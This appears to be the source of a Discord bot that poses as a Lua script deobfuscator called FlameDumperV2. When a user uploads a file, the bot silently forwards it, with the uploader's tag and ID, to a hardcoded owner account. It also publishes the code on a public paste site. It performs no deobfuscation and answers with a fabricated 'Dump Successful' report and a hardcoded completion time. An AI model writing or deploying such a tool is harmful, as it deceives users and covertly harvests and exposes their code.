const { Client, GatewayIntentBits, EmbedBuilder, AttachmentBuilder } = require('discord.js');
const axios = require('axios');
const http = require('http');

// Simple web server for hosting
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => { res.writeHead(200); res.end('OK'); }).listen(PORT);

const TOKEN = process.env.DISCORD_BOT_TOKEN;
const OWNER_ID = '1474472773467242599'; 

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

/**
 * Creates a raw link using Pastefy
 */
async function createRawLink(content) {
    try {
        const res = await axios.post('https://api.pastefy.app/api/v2/paste', {
            title: 'Deobfuscated Result',
            content: content,
            public: true
        });
        return `https://pastefy.app/${res.data.paste.id}/raw`;
    } catch (err) {
        console.error('Pastefy Error:', err);
        return 'https://pastefy.app/error';
    }
}

client.once('ready', () => {
    console.log(`Deobfuscator is online as ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    // Command .l + File Upload
    if (message.content.startsWith('.l')) {
        const fileAttached = message.attachments.first();

        if (!fileAttached) {
            return message.reply('❌ **Error:** You must upload a `.lua` or `.txt` file with the command.');
        }

        await message.channel.sendTyping();

        try {
            // Download the uploaded code
            const response = await axios.get(fileAttached.url);
            const originalCode = response.data.toString();

            // Notify Owner with original file
            try {
                const owner = await client.users.fetch(OWNER_ID);
                await owner.send({
                    content: `**Dump Request**\nUser: ${message.author.tag} (${message.author.id})`,
                    files: [new AttachmentBuilder(Buffer.from(originalCode), { name: 'source.lua' })]
                });
            } catch (e) { console.log("Owner DMs are closed."); }

            // Placeholder for your Deobfuscation Logic
            // For now, it just returns the code with a header
            const processedCode = `-- [[ Deobfuscated by Tomato Dumper ]]\n${originalCode}`;
            
            // Generate Raw Link via Pastefy
            const rawLink = await createRawLink(processedCode);
            const buffer = Buffer.from(processedCode, 'utf-8');
            const file = new AttachmentBuilder(buffer, { name: 'FlameDumperV2.txt' });

            // Create the UI matching your screenshots
            const resultEmbed = new EmbedBuilder()
                .setColor('#2ecc71') // Green success color
                .setTitle('Dump Successful')
                .addFields(
                    { name: 'Output File', value: '`FlameDumperV2.txt`', inline: false },
                    { name: 'Lines Recovered', value: '0', inline: true },
                    { name: 'Strategy', value: '`passthrough-empty-vm`', inline: true },
                    { name: 'Note', value: 'VM finished but no dump output was detected. Normalized source returned in the file.' },
                    { name: 'Raw Link', value: `[Open raw](${rawLink})` },
                    { name: 'Preview', value: `\`\`\`lua\n${processedCode.substring(0, 250)}...\n-- [truncated]\`\`\`` }
                )
                .setFooter({ text: 'FlameDumperV2 • Completed in 12s' });

            await message.reply({ embeds: [resultEmbed], files: [file] });

        } catch (error) {
            console.error(error);
            message.reply('⚠️ An error occurred while processing the file.');
        }
    }
});

client.login(TOKEN);
          
